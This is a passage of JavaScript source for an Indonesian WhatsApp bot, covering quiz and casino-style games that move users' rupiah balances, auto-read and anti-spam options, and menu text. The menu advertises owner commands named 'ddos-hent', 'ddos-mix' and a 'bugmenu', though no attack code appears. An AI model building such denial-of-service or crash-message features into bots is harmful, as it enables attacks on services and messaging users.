if (!roof.pilih && !roof.pilih2) await rafatharcode.sendMessage(from, {text: `Kedua pemain tidak niat bermain\nSuit dibatalkan!`})
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
sffp = `@${(roof.pilih ? roof.p2 : roof.p).split('@')[0]} tidak memilih suit, game berakhir!`
await rafatharcode.sendTeks(from, sffp, fkontak)
}
delete suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /^(.gunting|gunting)/i
let b = /^(.batu|batu)/i
let k = /^(.kertas|kertas)/i
let reg = /^(.gunting|.batu|.kertas|gunting|batu|kertas)/i
if (jwb && reg.test(body) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(body.toLowerCase())[0]
roof.text = body
await rafatharcode.sendMessage(from, {text: `Kamu telah memilih ${body} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`}, {quoted:fkontak})
if (!roof.pilih2) await rafatharcode.sendMessage(roof.p2, {text: 'Lawan sudah memilih\nSekarang giliran kamu'})
}
if (jwb2 && reg.test(body) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(body.toLowerCase())[0]
roof.text2 = body

tyu = `Kamu telah memilih ${body} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`
await rafatharcode.sendMessage(from, {text: tyu}, {quoted:m})

if (!roof.pilih) await rafatharcode.sendMessage(roof.p, {text: 'Lawan sudah memilih\nSekarang giliran kamu'})
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
await rafatharcode.sendTeks(roof.asal, `${tie ? '*HASIL SERI*\n\n' : ''}@${roof.p.split('@')[0]} (${roof.text}) ${tie ? '' : roof.p == win ? 'Menang' : 'Kalah'}\n@${roof.p2.split('@')[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? 'Menang' : 'Kalah'}`, bejir('HASIL SUIT PVP', null))
delete suit[roof.id]
}}

let pilih = "◽", bomb = "💣";
if (petakbom[m.sender]) {
if (!/^[1-9]|10$/i.test(body)) return !0;
if (petakbom[m.sender].petak[parseInt(body) - 1] === 1) return !0;
if (petakbom[m.sender].petak[parseInt(body) - 1] === 2) {
petakbom[m.sender].board[parseInt(body) - 1] = bomb;
petakbom[m.sender].pick++;
petakbom[m.sender].bomb--;
petakbom[m.sender].nyawa.pop();

let brd = petakbom[m.sender].board;
if (petakbom[m.sender].nyawa.length < 1) {
await m.reply(`*GAME TELAH BERAKHIR*\nKamu terkena bom!\n\n ${brd.slice(0, 3).join("")}\n${brd.slice(3, 6).join("")}\n${brd.slice(6).join("")}\n\nTerpilih: ${petakbom[m.sender].pick}`);
delete petakbom[m.sender];
} else await m.reply(`*PILIH ANGKA*\n\nKamu terkena bom!\n ${brd.slice(0, 3).join("")}\n${brd.slice(3, 6).join("")}\n${brd.slice(6).join("")}\n\nTerpilih: ${petakbom[m.sender].pick}\nNyawa: ${petakbom[m.sender].nyawa}`);
return !0;
}
if (petakbom[m.sender].petak[parseInt(body) - 1] === 0) {
petakbom[m.sender].petak[parseInt(body) - 1] = 1;
petakbom[m.sender].board[parseInt(body) - 1] = pilih;
petakbom[m.sender].pick++;
petakbom[m.sender].lolos--;
let brd = petakbom[m.sender].board;
if (petakbom[m.sender].lolos < 1) {
await m.reply(`*KAMU MENANG*\n\n${brd.slice(0, 3).join("")}\n${brd.slice(3, 6).join("")}\n${brd.slice(6).join("")}\n\nTerpilih: ${petakbom[m.sender].pick}\nSisa Nyawa: ${petakbom[m.sender].nyawa}\nBom: ${petakbom[m.sender].bomb}`);
delete petakbom[m.sender];
} else m.reply(`*PILIH ANGKA*\n\n${brd.slice(0, 3).join("")}\n${brd.slice(3, 6).join("")}\n${brd.slice(6).join("")}\n\nTerpilih: ${petakbom[m.sender].pick}\nSisa Nyawa: ${petakbom[m.sender].nyawa}\nBom: ${petakbom[m.sender].bomb}`)
}}

if (fs.existsSync(`./data/${m.chat}.json`)) {
var casinoo = setCasino(`${m.chat}`)
if (m.sender == `${casinoo.Y}` && body.toLowerCase() == 'n') {
rafatharcode.sendMessage(m.chat, { text: `*GAME DIBATALKAN*\n\n• @${casinoo.Y.split("@")[0]} Membatalkan game`, mentions: [casinoo.Y] }, {quoted: m })
deleteCasino(m.chat)
}
if (m.sender == `${casinoo.Y}` && body.toLowerCase() == 'y') {
var angka1 = await randomNomor(10, 20)
var angka2 = await randomNomor(10, 20)
if (angka1 > angka2) {
starGame = `*🎰 GAME CASINO 💰*

• @${casinoo.Z} --> ${angka1} 👑
• @${casinoo.Y.split('@')[0]} --> ${angka2} 🥈

Pemenang: [ @${casinoo.Z} ]
Mendapatkan: Rp ${nebal(casinoo.nominal)}`
rafatharcode.sendMessage(m.chat, { text: starGame, mentions: [casinoo.Z + "@s.whatsapp.net", casinoo.Y]}, {quoted: m })
await addSaldo(`${casinoo.Z}@s.whatsapp.net`, nebal(casinoo.nominal), db_saldo)
await minSaldo(`${casinoo.Y}`, nebal(casinoo.nominal), db_saldo)
deleteCasino(m.chat)
} else if (angka1 < angka2) {
starGame = `*🎰 GAME CASINO 💰*

• @${casinoo.Z} --> ${angka1} 🥈
• @${casinoo.Y.split('@')[0]} --> ${angka2} 👑

Pemenang: [ @${casinoo.Y.split('@')[0]} ]
Mendapatkan: Rp ${nebal(casinoo.nominal)}`
rafatharcode.sendMessage(m.chat, { text: starGame, mentions: [casinoo.Z + "@s.whatsapp.net", casinoo.Y] }, {quoted: m })
await addSaldo(`${casinoo.Y}`, nebal(casinoo.nominal), db_saldo)
await minSaldo(`${casinoo.Z}@s.whatsapp.net`, nebal(casinoo.nominal), db_saldo)
deleteCasino(m.chat)
} else if (angka1 = angka2) {
starGame = `*🎰 GAME CASINO 💰*

• @${casinoo.Z} --> ${angka1} 📍
• @${casinoo.Y.split('@')[0]} --> ${angka2} 📍

Hasil draw, tidak ada pemenang!`
rafatharcode.sendMessage(m.chat, { text: starGame, mentions: [casinoo.Z + "@s.whatsapp.net", casinoo.Y]}, { quoted: m })
deleteCasino(m.chat)
}}
}

if ((from in tebakgambar)) {
let { soal, jawaban, hadiah, waktu } = tebakgambar[m.chat]
if (body.toLowerCase().includes(jawaban) && !m.fromMe) {
await m.reply(`*JAWABAN BENAR*\nJawaban: ${jawaban}\nHadiah: 6 limit`);
addLimit(usere, 6, db_limit)
rafatharcode.sendMessage(m.chat, {react: {text: '🔵', key: m.key}})
clearTimeout(waktu);
delete tebakgambar[m.chat];
} else if (similarity(body.toLowerCase(), jawaban) >= threshold && !m.fromMe) {
m.reply(`Waduh, sedikit lagi tuh!`)
} else if (!m.fromMe && m.text.includes('.nyerah')) {
rafatharcode.sendMessage(m.chat, {react: {text: '🙂', key: m.key,}})
await rafatharcode.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
clearTimeout(waktu);
delete tebakgambar[m.chat];
} else if (!m.fromMe) {
rafatharcode.sendMessage(m.chat, {react: {text: '🔴', key: m.key,}})}
}

if ((from in tebakkalimat)) {
let { soal, jawaban, hadiah, waktu } = tebakkalimat[m.chat]
if (body.toLowerCase().includes(jawaban) && !m.fromMe) {
await m.reply(`*JAWABAN BENAR*\nJawaban: ${jawaban}\nHadiah: 6 limit`);
addLimit(usere, 6, db_limit)
rafatharcode.sendMessage(m.chat, {react: {text: '🔵', key: m.key}})
clearTimeout(waktu);
delete tebakkalimat[m.chat];
}else if (similarity(body.toLowerCase(), jawaban) >= threshold && !m.fromMe) {
m.reply(`Waduh, sedikit lagi tuh!`)
} else if (!m.fromMe && m.text.includes('.nyerah')) {
rafatharcode.sendMessage(m.chat, {react: {text: '🙂', key: m.key,}})
await rafatharcode.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
clearTimeout(waktu);
delete tebakkalimat[m.chat];
} else if (!m.fromMe) {
rafatharcode.sendMessage(m.chat, {react: {text: '🔴', key: m.key,}})}
}

if ((from in tebakkata)) {
let { soal, jawaban, hadiah, waktu } = tebakkata[m.chat]
if (body.toLowerCase().includes(jawaban) && !m.fromMe) {
await m.reply(`*JAWABAN BENAR*\nJawaban: ${jawaban}\nHadiah: 6 limit`);
addLimit(usere, 6, db_limit)
rafatharcode.sendMessage(m.chat, {react: {text: '🔵', key: m.key}})
clearTimeout(waktu);
delete tebakkata[m.chat];
} else if (similarity(body.toLowerCase(), jawaban) >= threshold && !m.fromMe) {
m.reply(`Waduh, sedikit lagi tuh!`)
} else if (!m.fromMe && m.text.includes('.nyerah')) {
rafatharcode.sendMessage(m.chat, {react: {text: '🙂', key: m.key,}})
await rafatharcode.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
clearTimeout(waktu);
delete tebakkata[m.chat];
} else if (!m.fromMe) {
rafatharcode.sendMessage(m.chat, {react: {text: '🔴', key: m.key,}})}
}

if ((from in tebaklirik)) {
let { soal, jawaban, hadiah, waktu } = tebaklirik[m.chat]
if (body.toLowerCase().includes(jawaban) && !m.fromMe) {
await m.reply(`*JAWABAN BENAR*\nJawaban: ${jawaban}\nHadiah: 6 limit`);
addLimit(usere, 6, db_limit)
rafatharcode.sendMessage(m.chat, {react: {text: '🔵', key: m.key}})
clearTimeout(waktu);
delete tebaklirik[m.chat];
} else if (similarity(body.toLowerCase(), jawaban) >= threshold && !m.fromMe) {
m.reply(`Waduh, sedikit lagi tuh!`)
} else if (!m.fromMe && m.text.includes('.nyerah')) {
rafatharcode.sendMessage(m.chat, {react: {text: '🙂', key: m.key,}})
await rafatharcode.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
clearTimeout(waktu);
delete tebaklirik[m.chat];
} else if (!m.fromMe) {
rafatharcode.sendMessage(m.chat, {react: {text: '🔴', key: m.key,}})}
}

if ((from in tebakanime)) {
let { soal, jawaban, hadiah, waktu } = tebakanime[m.chat]
if (body.toLowerCase().includes(jawaban) && !m.fromMe) {
await m.reply(`*JAWABAN BENAR*\nJawaban: ${jawaban}\nHadiah: 6 limit`);
addLimit(usere, 6, db_limit)
rafatharcode.sendMessage(m.chat, {react: {text: '🔵', key: m.key}})
clearTimeout(waktu);
delete tebakanime[m.chat];
} else if (similarity(body.toLowerCase(), jawaban) >= threshold && !m.fromMe) {
m.reply(`Waduh, sedikit lagi tuh!`)
} else if (!m.fromMe && m.text.includes('.nyerah')) {
rafatharcode.sendMessage(m.chat, {react: {text: '🙂', key: m.key,}})
await rafatharcode.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
clearTimeout(waktu);
delete tebakanime[m.chat];
} else if (!m.fromMe) {
rafatharcode.sendMessage(m.chat, {react: {text: '🔴', key: m.key,}})}
}

if ((from in tebaklagu)) {
let { soal, jawaban, hadiah, waktu } = tebaklagu[m.chat]
if (body.toLowerCase().includes(jawaban) && !m.fromMe) {
await m.reply(`*JAWABAN BENAR*\nJawaban: ${jawaban}\nHadiah: 6 limit`);
addLimit(usere, 6, db_limit)
rafatharcode.sendMessage(m.chat, {react: {text: '🔵', key: m.key}})
clearTimeout(waktu);
delete tebaklagu[m.chat];
} else if (similarity(body.toLowerCase(), jawaban) >= threshold && !m.fromMe) {
m.reply(`Waduh, sedikit lagi tuh!`)
} else if (!m.fromMe && m.text.includes('.nyerah')) {
rafatharcode.sendMessage(m.chat, {react: {text: '🙂', key: m.key,}})
await rafatharcode.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
clearTimeout(waktu);
delete tebaklagu[m.chat];
} else if (!m.fromMe) {
rafatharcode.sendMessage(m.chat, {react: {text: '🔴', key: m.key,}})}
}

if ((from in kuis)) {
let { soal, jawaban, hadiah, waktu } = kuis[m.chat]
if (body.toLowerCase().includes(jawaban) && !m.fromMe) {
await m.reply(`*JAWABAN BENAR*\nJawaban: ${jawaban}\nHadiah: 6 limit`);
addLimit(usere, 6, db_limit)
rafatharcode.sendMessage(m.chat, {react: {text: '🔵', key: m.key}})
clearTimeout(waktu);
delete kuis[m.chat];
} else if (similarity(body.toLowerCase(), jawaban) >= threshold && !m.fromMe) {
m.reply(`Waduh, sedikit lagi tuh!`)
} else if (!m.fromMe && m.text.includes('.nyerah')) {
rafatharcode.sendMessage(m.chat, {react: {text: '🙂', key: m.key,}})
await rafatharcode.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
clearTimeout(waktu);
delete kuis[m.chat];
} else if (!m.fromMe) {
rafatharcode.sendMessage(m.chat, {react: {text: '🔴', key: m.key,}})}
}

if ((from in siapakahaku)) {
let { soal, jawaban, hadiah, waktu } = siapakahaku[m.chat]
if (body.toLowerCase().includes(jawaban) && !m.fromMe) {
await m.reply(`*JAWABAN BENAR*\nJawaban: ${jawaban}\nHadiah: 6 limit`);
addLimit(usere, 6, db_limit)
rafatharcode.sendMessage(m.chat, {react: {text: '🔵', key: m.key}})
clearTimeout(waktu);
delete siapakahaku[m.chat];
} else if (similarity(body.toLowerCase(), jawaban) >= threshold && !m.fromMe) {
m.reply(`Waduh, sedikit lagi tuh!`)
} else if (!m.fromMe && m.text.includes('.nyerah')) {
rafatharcode.sendMessage(m.chat, {react: {text: '🙂', key: m.key,}})
await rafatharcode.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
clearTimeout(waktu);
delete siapakahaku[m.chat];
} else if (!m.fromMe) {
rafatharcode.sendMessage(m.chat, {react: {text: '🔴', key: m.key,}})}
}

if ((from in tebakkimia)) {
let { soal, jawaban, hadiah, waktu } = tebakkimia[m.chat]
if (body.toLowerCase().includes(jawaban) && !m.fromMe) {
await m.reply(`*JAWABAN BENAR*\nJawaban: ${jawaban}\nHadiah: 6 limit`);
addLimit(usere, 6, db_limit)
rafatharcode.sendMessage(m.chat, {react: {text: '🔵', key: m.key}})
clearTimeout(waktu);
delete tebakkimia[m.chat];
} else if (similarity(body.toLowerCase(), jawaban) >= threshold && !m.fromMe) {
m.reply(`Waduh, sedikit lagi tuh!`)
} else if (!m.fromMe && m.text.includes('.nyerah')) {
rafatharcode.sendMessage(m.chat, {react: {text: '🙂', key: m.key,}})
await rafatharcode.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
clearTimeout(waktu);
delete tebakkimia[m.chat];
} else if (!m.fromMe) {
rafatharcode.sendMessage(m.chat, {react: {text: '🔴', key: m.key,}})}
}

if ((from in tebakbendera)) {
let { soal, jawaban, hadiah, waktu } = tebakbendera[m.chat]
if (body.toLowerCase().includes(jawaban) && !m.fromMe) {
await m.reply(`*JAWABAN BENAR*\nJawaban: ${jawaban}\nHadiah: 6 limit`);
addLimit(usere, 6, db_limit)
rafatharcode.sendMessage(m.chat, {react: {text: '🔵', key: m.key}})
clearTimeout(waktu);
delete tebakbendera[m.chat];
} else if (similarity(body.toLowerCase(), jawaban) >= threshold && !m.fromMe) {
m.reply(`Waduh, sedikit lagi tuh!`)
} else if (!m.fromMe && m.text.includes('.nyerah')) {
rafatharcode.sendMessage(m.chat, {react: {text: '🙂', key: m.key,}})
await rafatharcode.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
clearTimeout(waktu);
delete tebakbendera[m.chat];
} else if (!m.fromMe) {
rafatharcode.sendMessage(m.chat, {react: {text: '🔴', key: m.key,}})}
}

if ((from in asahotak)) {
let { soal, jawaban, hadiah, waktu } = asahotak[m.chat]
if (body.toLowerCase().includes(jawaban) && !m.fromMe) {
await m.reply(`*JAWABAN BENAR*\nJawaban: ${jawaban}\nHadiah: 6 limit`);
addLimit(usere, 6, db_limit)
rafatharcode.sendMessage(m.chat, {react: {text: '🔵', key: m.key}})
clearTimeout(waktu);
delete asahotak[m.chat];
} else if (similarity(body.toLowerCase(), jawaban) >= threshold && !m.fromMe) {
m.reply(`Waduh, sedikit lagi tuh!`)
} else if (!m.fromMe && m.text.includes('.nyerah')) {
rafatharcode.sendMessage(m.chat, {react: {text: '🙂', key: m.key,}})
await rafatharcode.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
clearTimeout(waktu);
delete asahotak[m.chat];
} else if (!m.fromMe) {
rafatharcode.sendMessage(m.chat, {react: {text: '🔴', key: m.key,}})}
}

if ((from in susunkata)) {
let { soal, jawaban, hadiah, waktu } = susunkata[m.chat]
if (body.toLowerCase().includes(jawaban) && !m.fromMe) {
await m.reply(`*JAWABAN BENAR*\nJawaban: ${jawaban}\nHadiah: 6 limit`);
addLimit(usere, 6, db_limit)
rafatharcode.sendMessage(m.chat, {react: {text: '🔵', key: m.key}})
clearTimeout(waktu);
delete susunkata[m.chat];
} else if (similarity(body.toLowerCase(), jawaban) >= threshold && !m.fromMe) {
m.reply(`Waduh, sedikit lagi tuh!`)
} else if (!m.fromMe && m.text.includes('.nyerah')) {
rafatharcode.sendMessage(m.chat, {react: {text: '🙂', key: m.key,}})
await rafatharcode.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
clearTimeout(waktu);
delete susunkata[m.chat];
} else if (!m.fromMe) {
rafatharcode.sendMessage(m.chat, {react: {text: '🔴', key: m.key,}})}
}

if ((from in caklontong)) {
let { soal, jawaban, hadiah, waktu } = caklontong[m.chat]
if (body.toLowerCase().includes(jawaban) && !m.fromMe) {
await m.reply(`*JAWABAN BENAR*\nJawaban: ${jawaban}\nHadiah: 6 limit`);
addLimit(usere, 6, db_limit)
rafatharcode.sendMessage(m.chat, {react: {text: '🔵', key: m.key}})
clearTimeout(waktu);
delete caklontong[m.chat];
} else if (similarity(body.toLowerCase(), jawaban) >= threshold && !m.fromMe) {
m.reply(`Waduh, sedikit lagi tuh!`)
} else if (!m.fromMe && m.text.includes('.nyerah')) {
rafatharcode.sendMessage(m.chat, {react: {text: '🙂', key: m.key,}})
await rafatharcode.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
clearTimeout(waktu);
delete caklontong[m.chat];
} else if (!m.fromMe) {
rafatharcode.sendMessage(m.chat, {react: {text: '🔴', key: m.key,}})}
}

if ((from in kuismath)) {
let { soal, jawaban, hadiah, waktu } = kuismath[m.chat]
if (body.toLowerCase().includes(jawaban) && !m.fromMe) {
await m.reply(`*JAWABAN BENAR*\nJawaban: ${jawaban}\nHadiah: 6 limit`);
addLimit(usere, 6, db_limit)
rafatharcode.sendMessage(m.chat, {react: {text: '🔵', key: m.key}})
clearTimeout(waktu);
delete kuismath[m.chat];
} else if (similarity(body.toLowerCase(), jawaban) >= threshold && !m.fromMe) {
m.reply(`Waduh, sedikit lagi tuh!`)
} else if (!m.fromMe && m.text.includes('.nyerah')) {
rafatharcode.sendMessage(m.chat, {react: {text: '🙂', key: m.key,}})
await rafatharcode.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
clearTimeout(waktu);
delete kuismath[m.chat];
} else if (!m.fromMe) {
rafatharcode.sendMessage(m.chat, {react: {text: '🔴', key: m.key,}})}
}

const JwbTrue = (tebak, hadiah) => {
return`*🎮 ${tebak} 🎮*\n\nJawaban Benar! 🎉\n+ ${hadiah} Limit`
}
const waktuHabis = (jawaban) => {
return `*WAKTU HABIS!*\nJawaban: ${jawaban}`
}

if (tebakgame[m.chat] && !m.fromMe) {
let json = JSON.parse(JSON.stringify(tebakgame[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (body.toLowerCase() == jawaban && !m.fromMe) {
await addLimit(m.sender, tebakgame[m.chat][2], db_limit) 
await m.reply(JwbTrue("TEBAK GAME", tebakgame[m.chat][2]) + `\n\nKetik .tebakgame untuk bermain lagi...`)
clearTimeout(tebakgame[m.chat][3])
delete tebakgame[m.chat]
} else if (body.toLowerCase().includes('.nyerah', '. nyerah')) {
m.reply('Yahh, masa nyerah :)')
clearTimeout(tebakgame[m.chat][3])
delete tebakgame[m.chat]
} else if (similarity(body.toLowerCase(), jawaban) >= threshold && !m.fromMe)
m.reply(`Waduh, sedikit lagi tuh!`)
else if (!m.fromMe) {
rafatharcode.sendMessage(m.chat, {react: { text: "🔴",key: m.key,}})
}}

const totalFitur = () =>{
var mytext = fs.readFileSync("rafatharcode.js").toString()
var numUpper = (mytext.match(/case '/g) || []).length;
return numUpper
}

if (isCmd && autotyping) {
if (command) { rafatharcode.readMessages([m.key])}
rafatharcode.sendPresenceUpdate('composing', from)
}

if (isCmd && autoread) {
const readkey = { remoteJid: m.chat, id: m.key.id, participant: m.isGroup ? m.key.participant : undefined }
await rafatharcode.readMessages([readkey]); }

if (autobio) {
const status = `${botname} Online`;
rafatharcode.updateProfileStatus(status).catch(_ => _);
}

if (isCmd && !m.key.fromMe && antispam) {
if (antispam.isFiltered(m.sender)) return m.reply('*( Anti Spam )* Tolong berikan jeda 5 detik.')
antispam.addFilter(m.sender)
}

if (body && budy && antibot) {
if (mek.key.id.startsWith('B1EY') && mek.key.id.length === 20) {
if (mek.key.fromMe) return !0
reply(`*( Anti Bot )* Grup akan ditutup sementara.`)
if (!isBotAdmins) return !0
await rafatharcode.sendMessage(m.chat, { delete: m.key })
rafatharcode.groupSettingUpdate(from, 'announcement')
}
if (mek.key.id.startsWith('BAE5') && mek.key.id.length === 16) {
if (mek.key.fromMe) return !0
reply(`*( Anti Bot )* Grup akan ditutup sementara.`)
if (!isBotAdmins) return !0
await rafatharcode.sendMessage(m.chat, { delete: m.key })
rafatharcode.groupSettingUpdate(from, 'announcement')
}
if (mek.key.id.startsWith('3EB0') && mek.key.id.length === 22) {
if (mek.key.fromMe) return !0
reply(`*( Anti Bot )* Grup akan ditutup sementara.`)
if (!isBotAdmins) return !0
await rafatharcode.sendMessage(m.chat, { delete: m.key })
rafatharcode.groupSettingUpdate(from, 'announcement')
}}

if (mek.key.id.startsWith('BAE5') && mek.key.id.length === 16) return
if (mek.key.id.startsWith('B1EY') && mek.key.id.length === 20) return
if (mek.key.id.startsWith('3EB0') && mek.key.id.length === 22) return

const jir = ['😀', '😃', '😄', '😁','😆','😅','😂','🤣', '😉', '😑', '😐']
const emji = jir[Math.floor(Math.random() * jir.length)]

const onlyOwn = () => {
rafatharcodereply('Fitur khusus owner!')
}
const onlyPrem = () => {
rafatharcodereply('Fitur khusus premium!')
}
const onlyOp = () => {
rafatharcodereply('Fitur khusus owner dan premium!')
}
const onlyOr = () => {
rafatharcodereply('Fitur khusus owner dan reseller!')
}
const onlyGrup = () => {
rafatharcodereply('Fitur khusus grup chat!')
}
const onlyPrivat = () => {
rafatharcodereply('Fitur khusus privat chat!')
}
const onlyAdmin = () => {
rafatharcodereply('Fitur khusus admin!')
}
const onlyBotAdmin = () => {
rafatharcodereply('Bot bukan admin!')
}

let banned = JSON.parse(fs.readFileSync('./data/banned.json'))
const isBan = banned.includes(m.sender)
if (isCmd && !isOwner && !m.key.fromMe) {
if (isBan) return rafatharcodereply('Akun kamu dibanned.')

if (m.isGroup && db.data.chats[m.chat].mute) {
if (!isAdmins && !isOwner) return
}}

switch (command) {

// ==========================

case 'menu': {
if (!isOwner) return Rafa2StickSc()
rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `Perkenalan Saya Adalah Bot WhatsApp *RiiSTORE ID* Yang Siap Membantu Anda!

⊑ *INFORMATION* ⊒
ꆜ *Nama* : ${botname}
ꆜ *Owner* : ${ownername}
ꆜ *Status* :  ${isOwner ? 'Owner' : isPremium ? 'Premium' : isReseller ? 'Reseller' : isReseller2 ? 'Reseller2' : isOwner2 ? 'Owner2' : 'User'}
ꆜ *Total Fitur* : ${totalFitur()}
ꆜ *Total User* : ${Object.values(db.data.users).length} Users
ꆜ *Saldo* : Rp. ${toRupiah(cekSaldo(m.sender, db_saldo))}
ꆜ *Prefix* : Multi Prefix
ꆜ *Versi* : 4.0.4 NEW ( SUPPORT CH)
ꆜ *Platfrom* : Chrome ( Ubuntu )
*BERIKUT MENU YANG TERSEDIA*
${prefix}.allmenu
${prefix}.ownermenu
${prefix}.groupmenu
${prefix}.kdtmenu
${prefix}.listsubdomain
${prefix}.bugmenu
${prefix}.topupmenu
${prefix}.pushmenu
${prefix}.downloadmenu
`

break
case 'allmenu':{
rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let teks = `┏━ ⊑ *INFO BOT* ⊒
┃ꆜ *Nama* : ${botname}
┃ꆜ *Owner* : ${ownername}
┃ꆜ *Prefix* : Multi Prefix
┃ꆜ *Versi* : 4.0.4 NEW ( SUPPORT CH)
┃ꆜ *Platfrom* : Chrome ( Ubuntu )
┗━━━━━━━━━━━━━━
┏━ ⊑ *INFO USER* ⊒
┃ꆜ *Nama* : ${db.data.users[m.sender].nama}
┃ꆜ *Profil* : ${db.data.users[m.sender].daftar ? 'Sudah terdaftar' : 'Belum terdaftar'}
┃ꆜ *Status* : ${isOwner ? 'Owner' : isPremium ? 'Premium' : isReseller ? 'Reseller' : isReseller2 ? 'Reseller2' : isOwner2 ? 'Owner2' : 'User'}
┃ꆜ *Saldo* : Rp. ${toRupiah(cekSaldo(m.sender, db_saldo))}
┃ꆜ *Limit* : ${cekLimit(m.sender, db_limit)} Limit
┗━━━━━━━━━━━━━━
`+readmore+`
┏━ ⊑ *MAIN MENU* ⊒
┃ ${prefix}regis
┃ ${prefix}unregis
┃ ${prefix}nickname
┃ ${prefix}infome
┃ ${prefix}infobot
┃ ${prefix}channel
┃ ${prefix}website 
┃ ${prefix}status
┃ ${prefix}script
┃ ${prefix}credit
┃ ${prefix}qris
┃ ${prefix}gold
┃ ${prefix}saldo
┃ ${prefix}limit
┃ ${prefix}vurl
┃ ${prefix}cekgold
┃ ${prefix}ceksaldo
┃ ${prefix}ceklimit
┃ ${prefix}info-cuaca
┃ ${prefix}listhargasc
┃ ${prefix}tfsaldo
┃ ${prefix}owner
┃ ${prefix}owner2
┃ ${prefix}ping
┃ ${prefix}runtime
┃ ${prefix}updatesc
┃ ${prefix}payment
┃ ${prefix}totalfitur
┃ ${prefix}report
┃ ${prefix}reply
┃ ${prefix}allpay
┃ ${prefix}reports
┃ ${prefix}delreports
┃ ${prefix}cekreports
┗━━━━━━━━━━━━━━
┏━ ⊑ *OWNER  MENU* ⊒
┃ ${prefix}addcase
┃ ${prefix}delcase
┃ ${prefix}getcase
┃ ${prefix}cekcase
┃ ${prefix}listcase
┃ ${prefix}addfunc
┃ ${prefix}delfunc
┃ ${prefix}getfunc
┃ ${prefix}cekfunc
┃ ${prefix}addlet
┃ ${prefix}dellet
┃ ${prefix}getlet
┃ ${prefix}addconst
┃ ${prefix}getdep
┃ ${prefix}gantifile
┃ ${prefix}sendfitur
┃ ${prefix}backup
┃ ${prefix}getsession
┃ ${prefix}delsession
┃ ${prefix}ambilsc
┃ ${prefix}sendsc
┃ ${prefix}sendbyr
┃ ${prefix}sendutang
┃ ${prefix}addres
┃ ${prefix}delres
┃ ${prefix}listres
┃ ${prefix}addprem
┃ ${prefix}delprem
┃ ${prefix}listprem
┃ ${prefix}addresinstall
┃ ${prefix}delresinstall
┃ ${prefix}listresinstall
┃ ${prefix}addreseller
┃ ${prefix}delreseller
┃ ${prefix}listreseller
┃ ${prefix}addreseller2
┃ ${prefix}delreseller2
┃ ${prefix}listreseller2
┃ ${prefix}addowner
┃ ${prefix}addowner2
┃ ${prefix}delowner
┃ ${prefix}listowner
┃ ${prefix}addgold
┃ ${prefix}mingold
┃ ${prefix}addsaldo
┃ ${prefix}minsaldo
┃ ${prefix}addlimit
┃ ${prefix}minlimit
┃ ${prefix}subfinder
┃ ${prefix}sampah
┃ ${prefix}delsampah
┃ ${prefix}delsampah2
┃ ${prefix}clearsesi
┃ ${prefix}ddos-hent
┃ ${prefix}ddos-mix
┃ ${prefix}getdb
┃ ${prefix}getfolder
┃ ${prefix}getfile
┃ ${prefix}getfile2
┃ ${prefix}getfile3
┃ ${prefix}addfolder
┃ ${prefix}addfile
┃ ${prefix}delfolder
┃ ${prefix}delfile
┃ ${prefix}jpmslide
┃ ${prefix}gcast
┃ ${prefix}bcgc
┃ ${prefix}bcimg
┃ ${prefix}bcvid
┃ ${prefix}adduserdb
┃ ${prefix}deluserdb
┃ ${prefix}idchannel
┃ ${prefix}idch
┃ ${prefix}hidetag
┃ ${prefix}block
┃ ${prefix}unblock
┃ ${prefix}listblock
┃ ${prefix}public
┃ ${prefix}self
┃ ${prefix}restart
┃ ${prefix}join
┃ ${prefix}totalmem
┃ ${prefix}cekasalmember
┃ ${prefix}cek-provider
┃ ${prefix}setnamabot
┃ ${prefix}setbiobot
┃ ${prefix}setppbot
┃ ${prefix}delppbot
┃ ${prefix}autotyping
┃ ${prefix}autoread
┃ ${prefix}autobio
┃ ${prefix}anticall
┃ ${prefix}antispam
┃ ${prefix}antibot
